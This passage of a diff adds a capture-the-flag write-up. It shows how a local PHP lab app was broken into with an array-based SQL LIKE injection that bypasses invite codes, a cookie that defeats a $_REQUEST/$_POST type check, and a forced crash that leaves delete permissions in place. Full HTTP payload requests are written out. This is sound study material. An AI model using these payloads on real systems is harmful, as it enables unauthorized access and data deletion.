+<span id="cb6-31"><a href="#cb6-31" aria-hidden="true" tabindex="-1"></a>            } <span class="cf">else</span> {</span>
+<span id="cb6-32"><a href="#cb6-32" aria-hidden="true" tabindex="-1"></a>                <span class="cf">return</span> <span class="st">&#39;IN &#39;</span> <span class="op">.</span> <span class="va">$this</span>-&gt;buildValue(<span class="va">$term</span>)<span class="ot">;</span></span>
+<span id="cb6-33"><a href="#cb6-33" aria-hidden="true" tabindex="-1"></a>            }</span>
+<span id="cb6-34"><a href="#cb6-34" aria-hidden="true" tabindex="-1"></a>        } <span class="cf">else</span> {</span>
+<span id="cb6-35"><a href="#cb6-35" aria-hidden="true" tabindex="-1"></a>            <span class="va">$comparison</span> <span class="op">=</span> <span class="st">&#39;=&#39;</span><span class="ot">;</span></span>
+<span id="cb6-36"><a href="#cb6-36" aria-hidden="true" tabindex="-1"></a>            <span class="va">$criterion_value</span> <span class="op">=</span> <span class="va">$term</span><span class="ot">;</span></span>
+<span id="cb6-37"><a href="#cb6-37" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb6-38"><a href="#cb6-38" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="st">&quot; </span><span class="va">$comparison</span><span class="st"> &quot;</span> <span class="op">.</span> <span class="va">$this</span>-&gt;buildValue(<span class="va">$criterion_value</span>)<span class="ot">;</span></span>
+<span id="cb6-39"><a href="#cb6-39" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb6-40"><a href="#cb6-40" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-41"><a href="#cb6-41" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="kw">function</span> isOperator(<span class="va">$operator</span>) {</span>
+<span id="cb6-42"><a href="#cb6-42" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="fu">in_array</span>(<span class="va">$operator</span><span class="ot">,</span> [</span>
+<span id="cb6-43"><a href="#cb6-43" aria-hidden="true" tabindex="-1"></a>            <span class="st">&#39;=&#39;</span><span class="ot">,</span> <span class="st">&#39;!=&#39;</span><span class="ot">,</span> <span class="st">&#39;&lt;&#39;</span><span class="ot">,</span> <span class="st">&#39;&lt;=&#39;</span><span class="ot">,</span> <span class="st">&#39;&gt;&#39;</span><span class="ot">,</span> <span class="st">&#39;&gt;=&#39;</span><span class="ot">,</span> <span class="st">&#39;&lt;&gt;&#39;</span><span class="ot">,</span></span>
+<span id="cb6-44"><a href="#cb6-44" aria-hidden="true" tabindex="-1"></a>            <span class="st">&#39;LIKE&#39;</span><span class="ot">,</span> <span class="st">&#39;NOT LIKE&#39;</span><span class="ot">,</span> <span class="st">&#39;IN&#39;</span><span class="ot">,</span> <span class="st">&#39;NOT IN&#39;</span><span class="ot">,</span></span>
+<span id="cb6-45"><a href="#cb6-45" aria-hidden="true" tabindex="-1"></a>        ]<span class="ot">,</span> <span class="kw">true</span>)<span class="ot">;</span></span>
+<span id="cb6-46"><a href="#cb6-46" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb6-47"><a href="#cb6-47" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-48"><a href="#cb6-48" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="kw">function</span> buildValue(<span class="va">$value</span>) {</span>
+<span id="cb6-49"><a href="#cb6-49" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (<span class="fu">is_array</span>(<span class="va">$value</span>)) {</span>
+<span id="cb6-50"><a href="#cb6-50" aria-hidden="true" tabindex="-1"></a>            <span class="cf">foreach</span> (<span class="va">$value</span> <span class="kw">as</span> <span class="va">$k</span> =&gt; <span class="va">$v</span>) {</span>
+<span id="cb6-51"><a href="#cb6-51" aria-hidden="true" tabindex="-1"></a>                <span class="va">$value</span>[<span class="va">$k</span>] <span class="op">=</span> <span class="va">$this</span>-&gt;quoteValue(<span class="va">$v</span>)<span class="ot">;</span></span>
+<span id="cb6-52"><a href="#cb6-52" aria-hidden="true" tabindex="-1"></a>            }</span>
+<span id="cb6-53"><a href="#cb6-53" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="st">&#39;(&#39;</span> <span class="op">.</span> <span class="fu">implode</span>(<span class="st">&#39;, &#39;</span><span class="ot">,</span> <span class="va">$value</span>) <span class="op">.</span> <span class="st">&#39;)&#39;</span><span class="ot">;</span></span>
+<span id="cb6-54"><a href="#cb6-54" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb6-55"><a href="#cb6-55" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="va">$this</span>-&gt;quoteValue(<span class="va">$value</span>)<span class="ot">;</span></span>
+<span id="cb6-56"><a href="#cb6-56" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb6-57"><a href="#cb6-57" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-58"><a href="#cb6-58" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="kw">function</span> quoteName(<span class="va">$name</span>) {</span>
+<span id="cb6-59"><a href="#cb6-59" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="st">&quot;`</span><span class="va">$name</span><span class="st">`&quot;</span><span class="ot">;</span></span>
+<span id="cb6-60"><a href="#cb6-60" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb6-61"><a href="#cb6-61" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-62"><a href="#cb6-62" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="kw">function</span> quoteValue(<span class="va">$value</span>) {</span>
+<span id="cb6-63"><a href="#cb6-63" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="va">$this</span>-&gt;conn-&gt;quote(<span class="va">$value</span>)<span class="ot">;</span></span>
+<span id="cb6-64"><a href="#cb6-64" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb6-65"><a href="#cb6-65" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p>So again, what if the input $code inst a string? Let’s look at what
+happens.</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>Imagine we call</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="va">$db</span>-&gt;select([</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;SELECT&#39;</span> =&gt; <span class="st">&#39;*&#39;</span><span class="ot">,</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;FROM&#39;</span> =&gt; <span class="st">&#39;invites&#39;</span><span class="ot">,</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;WHERE&#39;</span> =&gt; [<span class="st">&#39;code&#39;</span> =&gt; [<span class="st">&quot;LIKE&quot;</span><span class="ot">,</span> <span class="st">&quot;%%&quot;</span>]] <span class="co">// instead of &#39;code&#39; =&gt; &#39;astring&#39;</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>])<span class="ot">;</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="co">// The WHERE CLAUSE is built here</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="co">// buildTerm([&quot;LIKE&quot;, &quot;%%&quot;])</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="kw">function</span> buildTerm(<span class="va">$term</span>) {</span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>         <span class="cf">if</span> (<span class="fu">is_array</span>(<span class="va">$term</span>)) { <span class="co">// We hit this !</span></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> (<span class="fu">count</span>(<span class="va">$term</span>) <span class="op">==</span> <span class="dv">2</span> <span class="op">&amp;&amp;</span> <span class="kw">isset</span>(<span class="va">$term</span>[<span class="dv">0</span>]) <span class="co">/* LIKE */</span> <span class="op">&amp;&amp;</span> <span class="va">$this</span>-&gt;isOperator(<span class="va">$term</span>[<span class="dv">0</span>]) <span class="co">/* Yes because LIKE is in the operators */</span>) {</span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>                <span class="va">$comparison</span> <span class="op">=</span> <span class="va">$term</span>[<span class="dv">0</span>]<span class="ot">;</span> <span class="co">/* $comparison = LIKE */</span></span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>                <span class="va">$criterion_value</span> <span class="op">=</span> <span class="va">$term</span>[<span class="dv">1</span>]<span class="ot">;</span> <span class="co">/* value = %% */</span></span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a>            } <span class="cf">else</span> {</span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>                <span class="co">// default , code IN xyz</span></span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a>                <span class="cf">return</span> <span class="st">&#39;IN &#39;</span> <span class="op">.</span> <span class="va">$this</span>-&gt;buildValue(<span class="va">$term</span>)<span class="ot">;</span></span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a>            }</span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a>        } <span class="cf">else</span> {</span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a>            <span class="co">// default for string WHERE code = &#39;input&#39;</span></span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a>            <span class="va">$comparison</span> <span class="op">=</span> <span class="st">&#39;=&#39;</span><span class="ot">;</span></span>
+<span id="cb7-23"><a href="#cb7-23" aria-hidden="true" tabindex="-1"></a>            <span class="va">$criterion_value</span> <span class="op">=</span> <span class="va">$term</span><span class="ot">;</span></span>
+<span id="cb7-24"><a href="#cb7-24" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb7-25"><a href="#cb7-25" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="st">&quot; </span><span class="va">$comparison</span><span class="st"> &quot;</span> <span class="op">.</span> <span class="va">$this</span>-&gt;buildValue(<span class="va">$criterion_value</span>)<span class="ot">;</span> <span class="co">// just quotes our value (&#39;%%&#39;)</span></span>
+<span id="cb7-26"><a href="#cb7-26" aria-hidden="true" tabindex="-1"></a>        <span class="co">// returns LIKE &#39;%%&#39;</span></span>
+<span id="cb7-27"><a href="#cb7-27" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb7-28"><a href="#cb7-28" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-29"><a href="#cb7-29" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="kw">function</span> isOperator(<span class="va">$operator</span>) {</span>
+<span id="cb7-30"><a href="#cb7-30" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="fu">in_array</span>(<span class="va">$operator</span><span class="ot">,</span> [</span>
+<span id="cb7-31"><a href="#cb7-31" aria-hidden="true" tabindex="-1"></a>            <span class="st">&#39;=&#39;</span><span class="ot">,</span> <span class="st">&#39;!=&#39;</span><span class="ot">,</span> <span class="st">&#39;&lt;&#39;</span><span class="ot">,</span> <span class="st">&#39;&lt;=&#39;</span><span class="ot">,</span> <span class="st">&#39;&gt;&#39;</span><span class="ot">,</span> <span class="st">&#39;&gt;=&#39;</span><span class="ot">,</span> <span class="st">&#39;&lt;&gt;&#39;</span><span class="ot">,</span></span>
+<span id="cb7-32"><a href="#cb7-32" aria-hidden="true" tabindex="-1"></a>            <span class="st">&#39;LIKE&#39;</span><span class="ot">,</span> <span class="st">&#39;NOT LIKE&#39;</span><span class="ot">,</span> <span class="st">&#39;IN&#39;</span><span class="ot">,</span> <span class="st">&#39;NOT IN&#39;</span><span class="ot">,</span></span>
+<span id="cb7-33"><a href="#cb7-33" aria-hidden="true" tabindex="-1"></a>        ]<span class="ot">,</span> <span class="kw">true</span>)<span class="ot">;</span></span>
+<span id="cb7-34"><a href="#cb7-34" aria-hidden="true" tabindex="-1"></a>    }</span></code></pre></div>
+<p>So <em>in theory</em> if we can send an array
+<code>[&#39;LIKE&#39;, &#39;%%&#39;]</code> we create the statement</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> invites <span class="kw">WHERE</span> code <span class="kw">LIKE</span> <span class="st">&#39;%%&#39;</span></span></code></pre></div>
+<p><strong>PERFECT</strong> we would manage to register.</p>
+<p>At this point I changed the source code to remove the is_String check
+and send in this request to test.</p>
+<pre class="http"><code>POST /register.php HTTP/1.1
+Host: lvh.me:8000
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 31
+Origin: http://lvh.me:8000
+Connection: keep-alive
+Referer: http://lvh.me:8000/register.php
+Cookie: PHPSESSID=a8aa98f03bcf527e0a144b90d0f87dbf
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+username=lol&amp;password=hi&amp;code[]=LIKE&amp;code[]=%%</code></pre>
+<p>And the server does the following:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="fl">1.</span> <span class="kw">SELECT</span> `id`, `username`, `password` <span class="kw">FROM</span> `users` <span class="kw">WHERE</span> `username` <span class="op">=</span> <span class="st">&#39;lol&#39;</span> <span class="dv">2</span><span class="op">-</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="fl">2.</span> <span class="kw">INSERT</span> <span class="kw">INTO</span> `users` (`username`, `password`) <span class="kw">VALUES</span> (<span class="st">&#39;lol&#39;</span>, <span class="st">&#39;$2y$12$wkWuq83HFSAWovB76Z2pe.gmKrZHbeju2btS0h9Tmg59SlhS1JQn.&#39;</span>) <span class="kw">RETURNING</span> <span class="op">*</span> shop<span class="op">-</span></span></code></pre></div>
+<p>PERFECT WE GOT IT</p>
+<h2 id="the-problem">The Problem</h2>
+<p>We just have 1 <strong>big</strong> problem, the server checks if the
+introduced <code>code</code> is a string.</p>
+<p>This is when my colleague <a href="https://www.linkedin.com/in/4v1at0r"><span class="citation" data-cites="4v1at0r">@4v1at0r</span></a> comes in and I start showing
+him my progress.</p>
+<p>“The only problem is it doesn’t accept arrays, only strings” - I
+say<br><br />
+“Show me the code” - he says</p>
+<p>And he immediately finds the vulnerability:</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (<span class="kw">isset</span>(<span class="va">$_REQUEST</span>[<span class="st">&#39;username&#39;</span>]) <span class="op">&amp;&amp;</span> <span class="kw">isset</span>(<span class="va">$_REQUEST</span>[<span class="st">&#39;password&#39;</span>]) <span class="op">&amp;&amp;</span> <span class="kw">isset</span>(<span class="va">$_REQUEST</span>[<span class="st">&#39;code&#39;</span>]) <span class="op">&amp;&amp;</span> <span class="fu">is_string</span>(<span class="va">$_REQUEST</span>[<span class="st">&#39;code&#39;</span>])) {</span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (is_valid_invite(<span class="va">$_POST</span>[<span class="st">&#39;code&#39;</span>])) {</span></code></pre></div>
+<p>The app is using <code>$_REQUEST[&#39;code&#39;]</code> on the check and
+<code>$_POST[&#39;code&#39;]</code> on <code>is_Valid_invite()</code></p>
+<p>How could I have missed that !</p>
+<p>On PHP the variables in <code>$_REQUEST</code> are provided to the
+script via the GET, POST, and COOKIE input mechanisms, and in this order
+by default.</p>
+<p>So if we inject a code=lol in our cookies and a payload to perform
+the SQL injection on the code field, we will get something like:</p>
+<p><code>$_REQUEST[&#39;code&#39;]</code> = lol <br><br />
+<code>$_POST[&#39;code&#39;]</code> = <code>[LIKE, %%]</code></p>
+<p>So the is_string() check passes, and the SQL Injection happens, lets
+take a look at the request which contains the payload:</p>
+<pre class="http"><code>POST /register.php HTTP/1.1
+Host: lvh.me:8000
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 31
+Origin: http://lvh.me:8000
+Connection: keep-alive
+Referer: http://lvh.me:8000/register.php
+Cookie: PHPSESSID=a8aa98f03bcf527e0a144b90d0f87dbf; code=lol &lt;- !!!
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+username=lol&amp;password=hi&amp;code[]=LIKE&amp;code[]=%%</code></pre>
+<p>And it works, the server returns is_string(‘lol’) = true, and injects
+our code in the POST body allowing us to log in.</p>
+<h2 id="now-what">Now what?</h2>
+<p>We are logged in now what?<br />
+- We do not have perms to read the flag<br />
+- We can not register as admin<br />
+- We cannot set perms<br />
+- We cannot inject code to further exploit the SQLi vulnerability</p>
+<p>At this point I am stuck so I decide to check if I can use the same
+SQLi via the array in login, to login as admin. That is when I get this
+error</p>
+<pre><code>&lt;br /&gt;
+&lt;b&gt;Fatal error&lt;/b&gt;: Uncaught TypeError: check_user_exists(): Argument #1 ($user) must be of type string, array given, called in /app/login.php on line 17 and defined in /app/inc/users.php:15
+Stack trace:
+#0 /app/settings.php(17): check_user_exists(Array)
+#1 {main}
+thrown in &lt;b&gt;/app/inc/required.php&lt;/b&gt; on line &lt;b&gt;15&lt;/b&gt;&lt;br /&gt;</code></pre>
+<p>The program crashes because it enforces this is a string on the
+function parameters declaration</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a>check_user_exists(<span class="dt">string</span> <span class="va">$username</span>) { ... }</span></code></pre></div>
+<h2 id="settings">Settings</h2>
+<p>After logging in there were not many functions, we could only logout
+and visit a settings page.<br><br />
+The settings page allows to delete our user, let’s analyse the
+<code>settings.php</code> file:</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (<span class="kw">isset</span>(<span class="va">$_POST</span>[<span class="st">&#39;delete-user&#39;</span>])) {</span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>    <span class="va">$delete_uid</span> <span class="op">=</span> (<span class="dt">int</span>) <span class="va">$_REQUEST</span>[<span class="st">&#39;uid&#39;</span>]<span class="ot">;</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>    <span class="co">// if I have perms = delete any user</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (has_perms(<span class="st">&#39;users_delete&#39;</span><span class="ot">,</span> <span class="st">&#39;perms_delete&#39;</span>)) {</span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>        delete_user(<span class="va">$delete_uid</span>)<span class="ot">;</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>        show_success(<span class="st">&quot;User </span><span class="va">$delete_uid</span><span class="st"> has been deleted.&quot;</span>)<span class="ot">;</span></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>    <span class="co">// if not delete only myself</span></span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>    } <span class="cf">elseif</span> (<span class="va">$delete_uid</span> <span class="op">===</span> <span class="va">$_SESSION</span>[<span class="st">&#39;uid&#39;</span>]) {</span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>        <span class="co">// adds perms</span></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>        add_tmp_perms(<span class="st">&#39;users_delete&#39;</span><span class="ot">,</span> <span class="st">&#39;perms_delete&#39;</span>)<span class="ot">;</span></span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>        delete_user(<span class="va">$delete_uid</span>)<span class="ot">;</span></span>
+<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>        show_success(<span class="va">$_REQUEST</span>[<span class="st">&#39;msg&#39;</span>])<span class="ot">;</span></span>
+<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a>        <span class="co">// only removes perms here</span></span>
+<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a>        rm_tmp_perms(<span class="st">&#39;users_delete&#39;</span><span class="ot">,</span> <span class="st">&#39;perms_delete&#39;</span>)<span class="ot">;</span></span>
+<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a>        <span class="fu">header</span>(<span class="st">&#39;Location: logout.php&#39;</span>)<span class="ot">;</span></span>
+<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a>    } <span class="cf">else</span> {</span>
+<span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a>        show_error(<span class="st">&#39;You do not have permission to delete users.&#39;</span>)<span class="ot">;</span></span>
+<span id="cb15-18"><a href="#cb15-18" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p>After analysing I instantly thought “race condition” if we can make a
+request as soon as we get perms, we can delete any user, not just
+ours.</p>
+<p>Let’s take a look at <code>show_success()</code> function:</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> show_success(<span class="dt">string</span> <span class="va">$success</span>) {</span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">global</span> <span class="va">$msgs</span><span class="ot">;</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>    <span class="va">$msgs</span>[] <span class="op">=</span> [<span class="st">&#39;type&#39;</span> =&gt; <span class="st">&#39;success&#39;</span><span class="ot">,</span> <span class="st">&#39;text&#39;</span> =&gt; <span class="va">$success</span>]<span class="ot">;</span></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p>Well this is enforcing string just like check_user_exists() did ,
+let’s try to crash it.</p>
+<p>We send the following POST request, our account uid = 2</p>
+<pre class="http"><code>POST /settings.php?uid=2&amp;msg[]=HALT. HTTP/1.1
+Host: lvh.me:8000
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://lvh.me:8000
+Connection: keep-alive
+Referer: http://lvh.me:8000/settings.php
+Cookie: PHPSESSID=a8aa98f03bcf527e0a144b90d0f87dbf
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+delete-user=Delete+my+account&amp;msg[]=HALT.</code></pre>
+<p>Looking at logs</p>
+<pre><code>&lt;br /&gt;
+&lt;b&gt;Fatal error&lt;/b&gt;: Uncaught TypeError: show_success(): Argument #1 ($success) must be of type string, array given, called in /app/settings.php on line 17 and defined in /app/inc/required.php:15
+Stack trace:
+#0 /app/settings.php(17): show_success(Array)
+#1 {main}
+thrown in &lt;b&gt;/app/inc/required.php&lt;/b&gt; on line &lt;b&gt;15&lt;/b&gt;&lt;br /&gt;</code></pre>
+<p>So I am given <code>&#39;users_delete&#39;</code> and
+<code>&#39;perms_delete&#39;</code> perms. Our user is never removed and never
+gets logged out. Meaning the <strong>PHP session persists</strong> but
+the user is no longer registered on the the database.<br><br />
+At this point since I have <code>&#39;users_delete&#39;</code> and
+<code>&#39;perms_delete&#39;</code> permissions I can remove any user in the
+data base by simply calling <code>/settings.php?uid=X</code> , deleting
+user X.</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a>    } <span class="cf">elseif</span> (<span class="va">$delete_uid</span> <span class="op">===</span> <span class="va">$_SESSION</span>[<span class="st">&#39;uid&#39;</span>]) {</span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a>       <span class="co">// get perms</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>        add_tmp_perms(<span class="st">&#39;users_delete&#39;</span><span class="ot">,</span> <span class="st">&#39;perms_delete&#39;</span>)<span class="ot">;</span></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a>        <span class="co">// remove us from the user table</span></span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a>        delete_user(<span class="va">$delete_uid</span>)<span class="ot">;</span></span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a>        <span class="co">// CRASH</span></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a>        show_success(<span class="va">$_REQUEST</span>[<span class="st">&#39;msg&#39;</span>])<span class="ot">;</span></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a>        <span class="co">// never reaches here</span></span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a>        rm_tmp_perms(<span class="st">&#39;users_delete&#39;</span><span class="ot">,</span> <span class="st">&#39;perms_delete&#39;</span>)<span class="ot">;</span></span>
+<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a>        <span class="fu">header</span>(<span class="st">&#39;Location: logout.php&#39;</span>)<span class="ot">;</span></span></code></pre></div>
+<h1 id="installation-script">Installation script</h1>
+<p>There is an installation script <code>install.php</code> which allows
+to setup de app the first time we spawn it.<br><br />
+The file contains functions to setup de database, including an
+interesting function which creates the <code>admin</code> user:</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>...</span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="va">$db</span>-&gt;<span class="fu">exec</span>(<span class="st">&#39;CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)&#39;</span>)<span class="ot">;</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a>...</span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (<span class="op">!</span>get_user_by_name(<span class="st">&#39;admin&#39;</span>)) {</span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a>    <span class="va">$admin_pw</span> <span class="op">=</span> <span class="fu">bin2hex</span>(<span class="fu">random_bytes</span>(<span class="dv">16</span>))<span class="ot">;</span></span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a>    add_tmp_perms(<span class="st">&#39;users_add&#39;</span>)<span class="ot">;</span></span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a>    <span class="va">$admin</span> <span class="op">=</span> create_user(<span class="st">&#39;admin&#39;</span><span class="ot">,</span> <span class="va">$admin_pw</span>)<span class="ot">;</span></span>
+<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a>    rm_tmp_perms(<span class="st">&#39;users_add&#39;</span>)<span class="ot">;</span></span>
+<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a>    <span class="va">$uid</span> <span class="op">=</span> <span class="va">$admin</span>[<span class="st">&#39;id&#39;</span>]<span class="ot">;</span></span>
+<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a>    add_tmp_perms(<span class="st">&#39;perms_add&#39;</span>)<span class="ot">;</span></span>
+<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a>    add_perm(<span class="va">$uid</span><span class="ot">,</span> <span class="st">&#39;users_edit&#39;</span>)<span class="ot">;</span></span>
+<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a>    add_perm(<span class="va">$uid</span><span class="ot">,</span> <span class="st">&#39;users_delete&#39;</span>)<span class="ot">;</span></span>
